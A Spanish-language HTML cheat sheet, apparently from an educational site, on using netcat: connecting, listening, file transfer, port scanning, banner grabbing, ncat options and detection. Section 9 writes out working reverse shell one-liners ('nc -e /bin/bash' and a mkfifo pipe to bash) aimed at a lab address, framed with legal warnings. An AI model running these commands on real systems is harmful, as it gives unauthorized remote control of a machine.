@@ -1,0 +1,244 @@
+﻿<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Netcat · Chuletario</title>
+    <link rel="stylesheet" href="../assets/chuletas.css">
+    <link rel="icon" href="../assets/favicon.svg">
+  </head>
+  <body data-tema="hacking">
+    <!-- Cabecera de la chuleta -->
+    <header class="top">
+      <div class="wrap">
+        <div class="titulo">
+          <nav class="miga" aria-label="Ruta"><a href="../index.html">Chuletario</a><span aria-hidden="true">›</span><a href="index.html">Hacking</a><span aria-hidden="true">›</span><span>Netcat</span></nav>
+          <h1>Netcat</h1>
+        </div>
+        <div class="apoyo">
+          <p class="sub">La «navaja suiza» de las redes TCP/UDP: conectar, escuchar, transferir datos y depurar servicios, en entornos autorizados.</p>
+          <div class="herramientas"><button type="button" data-accion="tema">Tema oscuro</button><button type="button" data-accion="imprimir">Imprimir</button></div>
+        </div>
+      </div>
+    </header>
+    <nav class="nav-tema" aria-label="Chuletas de Hacking">
+      <div class="wrap"><a href="pentest.html">Pentest</a><a href="google-dorking.html">Google dorking</a><a href="nmap.html">Nmap</a><a href="netcat.html" aria-current="page">Netcat</a><a href="sqlmap.html">sqlmap</a></div>
+    </nav>
+    <main class="wrap">
+      <!-- Índice de secciones -->
+      <nav class="toc" aria-label="Secciones"><a href="#s1"><b>1</b>Qué es y qué versión tienes</a><a href="#s2"><b>2</b>Opciones más usadas</a><a href="#s3"><b>3</b>Conectar a un servicio (cliente)</a><a href="#s4"><b>4</b>Escuchar en un puerto (servidor)</a><a href="#s5"><b>5</b>Transferir ficheros</a><a href="#s6"><b>6</b>Chat y tubería entre equipos</a><a href="#s7"><b>7</b>Escaneo de puertos</a><a href="#s8"><b>8</b>Grabar un banner</a><a href="#s9"><b>9</b>Shells de administración remota</a><a href="#s10"><b>10</b>ncat: la versión moderna</a><a href="#s11"><b>11</b>Detección y defensa</a><a href="#s12"><b>12</b>Normas de uso</a></nav>
+      <div class="banda">
+        <p class="banda-titulo">Antes de empezar</p>
+        <p class="aviso"><strong>Solo con autorización.</strong> Netcat abre puertos, transfiere ficheros y puede lanzar shells remotas. Úsalo únicamente en tus propios equipos, en el laboratorio del aula o en máquinas creadas para practicar. Abrir un acceso remoto en una red ajena es intrusión, y en España el acceso no autorizado a sistemas está tipificado en el artículo 197 bis del Código Penal.</p>
+        <div class="cols">
+          <div>
+            <p class="banda-titulo">Las dos caras de netcat</p>
+            <figure class="codigo"><pre data-lang="bash"><code><span class="tok-coment"># en un equipo: escuchar (servidor)</span>
+<span class="tok-clave">nc</span> <span class="tok-atributo">-lvnp</span> 4444
+
+<span class="tok-coment"># en el otro: conectar (cliente)</span>
+<span class="tok-clave">nc</span> 192.168.56.101 4444</code></pre></figure>
+            <p class="txt">Lo que escribes en un lado sale por el otro. Sobre esa idea tan simple se montan transferencias, escaneos y shells.</p>
+          </div>
+          <div>
+            <p class="banda-titulo">¿Qué netcat tengo?</p>
+            <div class="tabla-scroll">
+              <table class="ref ">
+                <tbody>
+                  <tr><th scope="row"><code>nc -h</code></th><td>ver la ayuda y adivinar la variante</td></tr>
+                  <tr><th scope="row"><code>netcat-openbsd</code></th><td>el habitual en Debian, Ubuntu y Kali</td></tr>
+                  <tr><th scope="row"><code>netcat-traditional</code></th><td>la clásica; es la que trae <code>-e</code></td></tr>
+                  <tr><th scope="row"><code>ncat</code></th><td>la de Nmap; añade cifrado TLS</td></tr>
+                </tbody>
+              </table>
+            </div>
+            <p class="nota">Las opciones cambian según la variante. Si un ejemplo no funciona, comprueba con cuál estás: <code>readlink -f $(which nc)</code>.</p>
+          </div>
+        </div>
+      </div>
+      <!-- Secciones -->
+      <div class="rejilla">
+        <!-- 1. Qué es y qué versión tienes -->
+        <section id="s1" class="tarjeta">
+          <h2><span class="num">1</span>Qué es y qué versión tienes</h2>
+          <div class="cuerpo">
+            <p class="txt">Netcat lee y escribe datos a través de conexiones de red TCP o UDP. Funciona como una tubería (<code>|</code>) que en vez de conectar dos programas conecta dos equipos.</p>
+            <figure class="codigo"><pre data-lang="bash"><code><span class="tok-clave">sudo apt</span> install netcat-openbsd   <span class="tok-coment"># en Kali ya viene instalado</span>
+<span class="tok-clave">which</span> nc                            <span class="tok-coment"># dónde está</span>
+<span class="tok-clave">nc</span> <span class="tok-atributo">-h</span> 2&gt;&amp;1 | head                 <span class="tok-coment"># ayuda y variante</span></code></pre></figure>
+            <p class="nota">En muchos sistemas <code>nc</code>, <code>netcat</code> y (con Nmap) <code>ncat</code> son órdenes distintas. La <code>nc</code> de OpenBSD es la más extendida y la más segura, porque no trae la opción <code>-e</code>.</p>
+          </div>
+        </section>
+        <!-- 2. Opciones más usadas -->
+        <section id="s2" class="tarjeta">
+          <h2><span class="num">2</span>Opciones más usadas</h2>
+          <div class="cuerpo">
+            <div class="tabla-scroll">
+              <table class="ref ">
+                <tbody>
+                  <tr><th scope="row"><code>-l</code></th><td>modo escucha (servidor)</td></tr>
+                  <tr><th scope="row"><code>-p 4444</code></th><td>puerto (con <code>-l</code>, el puerto en el que escucha)</td></tr>
+                  <tr><th scope="row"><code>-v  -vv</code></th><td>más información de lo que ocurre</td></tr>
+                  <tr><th scope="row"><code>-n</code></th><td>no resolver nombres DNS (más rápido y sin ruido)</td></tr>
+                  <tr><th scope="row"><code>-u</code></th><td>usar UDP en vez de TCP</td></tr>
+                  <tr><th scope="row"><code>-w 5</code></th><td>cortar tras 5 s sin actividad</td></tr>
+                  <tr><th scope="row"><code>-k</code></th><td>seguir escuchando tras cerrarse una conexión</td></tr>
+                  <tr><th scope="row"><code>-z</code></th><td>solo comprobar el puerto, sin enviar datos</td></tr>
+                  <tr><th scope="row"><code>-e prog</code></th><td>ejecutar un programa al conectar (solo la variante <em>traditional</em>)</td></tr>
+                </tbody>
+              </table>
+            </div>
+            <p class="nota">Se combinan: <code>-lvnp</code> equivale a <code>-l -v -n -p</code>. Es el juego de opciones que más vas a repetir para poner un servidor a la escucha.</p>
+          </div>
+        </section>
+        <!-- 3. Conectar a un servicio (cliente) -->
+        <section id="s3" class="tarjeta">
+          <h2><span class="num">3</span>Conectar a un servicio (cliente)</h2>
+          <div class="cuerpo">
+            <figure class="codigo"><pre data-lang="bash"><code><span class="tok-clave">nc</span> 192.168.56.101 80          <span class="tok-coment"># abrir una conexión al puerto 80</span>
+<span class="tok-clave">nc</span> <span class="tok-atributo">-v</span> scanme.nmap.org 22       <span class="tok-coment"># ver el banner del servicio SSH</span>
+
+<span class="tok-coment"># hablar HTTP a mano</span>
+<span class="tok-clave">printf</span> <span class="tok-texto">'GET / HTTP/1.0\r\n\r\n'</span> | <span class="tok-clave">nc</span> <span class="tok-atributo">-v</span> ejemplo.local 80</code></pre></figure>
+            <p class="txt">Como cliente, netcat es útil para comprobar si un puerto responde y para hablar directamente con servicios de texto (HTTP, SMTP, POP3, Redis) sin un programa dedicado.</p>
+            <p class="nota">Con <code>-v</code> te dice si la conexión se abre («open») o la rechazan («refused»). Muy práctico para saber si un servicio está vivo.</p>
+          </div>
+        </section>
+        <!-- 4. Escuchar en un puerto (servidor) -->
+        <section id="s4" class="tarjeta">
+          <h2><span class="num">4</span>Escuchar en un puerto (servidor)</h2>
+          <div class="cuerpo">
+            <figure class="codigo"><pre data-lang="bash"><code><span class="tok-clave">nc</span> <span class="tok-atributo">-lvnp</span> 4444              <span class="tok-coment"># espera una conexión en el 4444</span>
+<span class="tok-clave">nc</span> <span class="tok-atributo">-lvnp</span> 4444 <span class="tok-atributo">-k</span>           <span class="tok-coment"># atiende varias conexiones seguidas</span>
+<span class="tok-clave">nc</span> <span class="tok-atributo">-lvnp</span> 4444 <span class="tok-operador">&gt;</span> recibido.txt  <span class="tok-coment"># guarda lo que llegue en un fichero</span></code></pre></figure>
+            <p class="txt">El modo escucha convierte tu equipo en un servidor de usar y tirar: puertos por encima de 1024 no necesitan <code>sudo</code>.</p>
+            <p class="aviso"><strong>Cuidado:</strong> mientras netcat escucha, ese puerto queda abierto a quien pueda alcanzarlo. Ciérralo con <code>Ctrl+C</code> en cuanto termines y no dejes escuchas olvidadas.</p>
+          </div>
+        </section>
+        <!-- 5. Transferir ficheros -->
+        <section id="s5" class="tarjeta">
+          <h2><span class="num">5</span>Transferir ficheros</h2>
+          <div class="cuerpo">
+            <figure class="codigo"><figcaption>Quien recibe abre primero la escucha</figcaption><pre data-lang="bash"><code><span class="tok-coment"># receptor</span>
+<span class="tok-clave">nc</span> <span class="tok-atributo">-lvnp</span> 4444 <span class="tok-operador">&gt;</span> copia.iso
+
+<span class="tok-coment"># emisor</span>
+<span class="tok-clave">nc</span> <span class="tok-atributo">-w</span> 3 192.168.56.20 4444 <span class="tok-operador">&lt;</span> original.iso</code></pre></figure>
+            <figure class="codigo"><figcaption>Carpeta entera, comprimida al vuelo</figcaption><pre data-lang="bash"><code><span class="tok-coment"># receptor</span>
+<span class="tok-clave">nc</span> <span class="tok-atributo">-lvnp</span> 4444 | <span class="tok-clave">tar</span> <span class="tok-atributo">-xzvf</span> -
+
+<span class="tok-coment"># emisor</span>
+<span class="tok-clave">tar</span> <span class="tok-atributo">-czf</span> - proyecto/ | <span class="tok-clave">nc</span> <span class="tok-atributo">-w</span> 3 192.168.56.20 4444</code></pre></figure>
+            <p class="nota">Comprueba que el fichero ha llegado entero comparando su huella en los dos lados: <code>sha256sum fichero</code>.</p>
+            <p class="aviso"><strong>Cuidado:</strong> netcat no cifra nada. Para copiar datos de verdad usa <code>scp</code> o <code>rsync</code> sobre SSH; deja netcat para el laboratorio.</p>
+          </div>
+        </section>
+        <!-- 6. Chat y tubería entre equipos -->
+        <section id="s6" class="tarjeta">
+          <h2><span class="num">6</span>Chat y tubería entre equipos</h2>
+          <div class="cuerpo">
+            <figure class="codigo"><pre data-lang="bash"><code><span class="tok-coment"># equipo A</span>
+<span class="tok-clave">nc</span> <span class="tok-atributo">-lvnp</span> 4444
+
+<span class="tok-coment"># equipo B: cada línea que escribas aparece en A, y al revés</span>
+<span class="tok-clave">nc</span> 192.168.56.10 4444</code></pre></figure>
+            <p class="txt">Sirve para probar rápidamente que dos máquinas se ven entre sí y que el puerto no está filtrado por un cortafuegos.</p>
+          </div>
+        </section>
+        <!-- 7. Escaneo de puertos -->
+        <section id="s7" class="tarjeta">
+          <h2><span class="num">7</span>Escaneo de puertos</h2>
+          <div class="cuerpo">
+            <figure class="codigo"><pre data-lang="bash"><code><span class="tok-clave">nc</span> <span class="tok-atributo">-zv</span> 192.168.56.101 20-1000       <span class="tok-coment"># rango de puertos</span>
+<span class="tok-clave">nc</span> <span class="tok-atributo">-zv</span> 192.168.56.101 22 80 443      <span class="tok-coment"># puertos sueltos</span>
+<span class="tok-clave">nc</span> <span class="tok-atributo">-zvu</span> 192.168.56.101 53            <span class="tok-coment"># un puerto UDP</span></code></pre></figure>
+            <p class="txt">Con <code>-z</code> netcat solo comprueba si el puerto acepta la conexión, sin enviar datos. Va bien para una prueba puntual.</p>
+            <p class="nota">Para un escaneo en serio usa <a href="nmap.html">Nmap</a>: es más rápido, detecta versiones y no depende de la variante de netcat que tengas.</p>
+          </div>
+        </section>
+        <!-- 8. Grabar un banner -->
+        <section id="s8" class="tarjeta">
+          <h2><span class="num">8</span>Grabar un banner</h2>
+          <div class="cuerpo">
+            <figure class="codigo"><pre data-lang="bash"><code><span class="tok-coment"># muchos servicios se presentan al conectar</span>
+<span class="tok-clave">nc</span> <span class="tok-atributo">-v</span> 192.168.56.101 22
+<span class="tok-coment"># SSH-2.0-OpenSSH_9.6p1 Ubuntu...</span>
+
+<span class="tok-clave">echo</span> <span class="tok-texto">""</span> | <span class="tok-clave">nc</span> <span class="tok-atributo">-w</span> 2 192.168.56.101 25   <span class="tok-coment"># banner de SMTP</span></code></pre></figure>
+            <p class="txt">El <em>banner</em> revela el servicio y muchas veces la versión: el primer dato para saber qué corre en cada puerto.</p>
+          </div>
+        </section>
+        <!-- 9. Shells de administración remota -->
+        <section id="s9" class="tarjeta">
+          <h2><span class="num">9</span>Shells de administración remota</h2>
+          <div class="cuerpo">
+            <p class="txt">En un laboratorio se usa para entender cómo funciona una shell remota. Hay dos formas, según quién inicia la conexión:</p>
+            <div class="tabla-scroll">
+              <table class="ref ">
+                <tbody>
+                  <tr><th scope="row">Directa</th><td>el objetivo <em>escucha</em> y tú te conectas a él</td></tr>
+                  <tr><th scope="row">Inversa</th><td>el objetivo <em>se conecta</em> a ti; atraviesa mejor los cortafuegos de salida</td></tr>
+                </tbody>
+              </table>
+            </div>
+            <figure class="codigo"><figcaption>Shell inversa en el laboratorio (variante traditional, con -e)</figcaption><pre data-lang="bash"><code><span class="tok-coment"># tu equipo (quien recibe): ponte a la escucha</span>
+<span class="tok-clave">nc</span> <span class="tok-atributo">-lvnp</span> 4444
+
+<span class="tok-coment"># la máquina de prácticas se conecta de vuelta</span>
+<span class="tok-clave">nc</span> <span class="tok-atributo">-e</span> /bin/bash 192.168.56.10 4444</code></pre></figure>
+            <figure class="codigo"><figcaption>Sin -e (nc de OpenBSD), con una FIFO</figcaption><pre data-lang="bash"><code><span class="tok-clave">rm</span> <span class="tok-atributo">-f</span> /tmp/f; <span class="tok-clave">mkfifo</span> /tmp/f
+<span class="tok-clave">cat</span> /tmp/f | /bin/bash <span class="tok-operador">-i</span> 2&gt;&amp;1 | <span class="tok-clave">nc</span> 192.168.56.10 4444 <span class="tok-operador">&gt;</span> /tmp/f</code></pre></figure>
+            <p class="aviso"><strong>Solo en tu laboratorio.</strong> Una shell inversa da control del sistema operativo remoto. Montarla en un equipo que no sea tuyo y sin permiso es un delito. Aquí está para que entiendas la técnica y sepas detectarla, no para usarla fuera de un entorno controlado.</p>
+          </div>
+        </section>
+        <!-- 10. ncat: la versión moderna -->
+        <section id="s10" class="tarjeta">
+          <h2><span class="num">10</span>ncat: la versión moderna</h2>
+          <div class="cuerpo">
+            <p class="txt"><code>ncat</code> viene con Nmap y mejora al netcat clásico: cifrado TLS, listas de control de acceso y registro. Las opciones básicas son casi iguales.</p>
+            <div class="tabla-scroll">
+              <table class="ref ">
+                <tbody>
+                  <tr><th scope="row"><code>ncat -lvnp 4444</code></th><td>escuchar, igual que <code>nc</code></td></tr>
+                  <tr><th scope="row"><code>--ssl</code></th><td>cifrar la conexión con TLS</td></tr>
+                  <tr><th scope="row"><code>--allow 192.168.56.10</code></th><td>solo aceptar a esa IP</td></tr>
+                  <tr><th scope="row"><code>-c "orden"</code></th><td>ejecutar una orden al conectar (equivale al viejo <code>-e</code>)</td></tr>
+                  <tr><th scope="row"><code>--broker</code></th><td>reparte mensajes entre varios clientes</td></tr>
+                </tbody>
+              </table>
+            </div>
+            <figure class="codigo"><pre data-lang="bash"><code><span class="tok-coment"># canal cifrado entre dos equipos del laboratorio</span>
+<span class="tok-clave">ncat</span> <span class="tok-atributo">--ssl</span> <span class="tok-atributo">-lvnp</span> 4444        <span class="tok-coment"># servidor</span>
+<span class="tok-clave">ncat</span> <span class="tok-atributo">--ssl</span> 192.168.56.10 4444   <span class="tok-coment"># cliente</span></code></pre></figure>
+          </div>
+        </section>
+        <!-- 11. Detección y defensa -->
+        <section id="s11" class="tarjeta">
+          <h2><span class="num">11</span>Detección y defensa</h2>
+          <div class="cuerpo">
+            <p class="txt">Saber usar netcat sirve también para reconocerlo desde el lado defensivo:</p>
+            <div class="tabla-scroll">
+              <table class="ref ">
+                <tbody>
+                  <tr><th scope="row"><code>ss -tulpn</code></th><td>ver qué puertos están a la escucha y qué proceso los abre</td></tr>
+                  <tr><th scope="row"><code>lsof -i :4444</code></th><td>quién está usando un puerto concreto</td></tr>
+                  <tr><th scope="row"><code>ps aux | grep nc</code></th><td>procesos netcat sospechosos</td></tr>
+                  <tr><th scope="row"><code>ufw deny 4444</code></th><td>bloquear un puerto en el cortafuegos</td></tr>
+                </tbody>
+              </table>
+            </div>
+            <p class="nota">Una escucha en un puerto alto que no corresponde a ningún servicio conocido, o una conexión de salida a una IP rara, son señales típicas de una shell inversa.</p>
+          </div>
+        </section>
+        <!-- 12. Normas de uso -->
+        <section id="s12" class="tarjeta">
+          <h2><span class="num">12</span>Normas de uso</h2>
+          <div class="cuerpo"><p class="txt">Usa netcat solo en equipos propios o del laboratorio, y con permiso por escrito cuando trabajes sobre sistemas de otra persona. No dejes puertos a la escucha olvidados. Recuerda que no cifra: no lo emplees para mover datos reales. Y trata cualquier shell, banner o volcado como información sensible. Lo mismo que te permite auditar te permite hacer daño; la diferencia está en la autorización.</p></div>
+        </section>
+      </div>
+      <nav class="paginacion" aria-label="Chuleta anterior y siguiente"><a class="anterior" href="nmap.html">← Nmap</a><a class="siguiente" href="sqlmap.html">sqlmap →</a></nav>
+      <footer class="pie">Página de manual: <code>man nc</code> y <code>man ncat</code>. Guía de ncat en <a href="https://nmap.org/ncat/">nmap.org/ncat</a>.</footer>
+    </main>
+    <script src="../assets/chuletas.js" defer></script>
+  </body>
+</html>
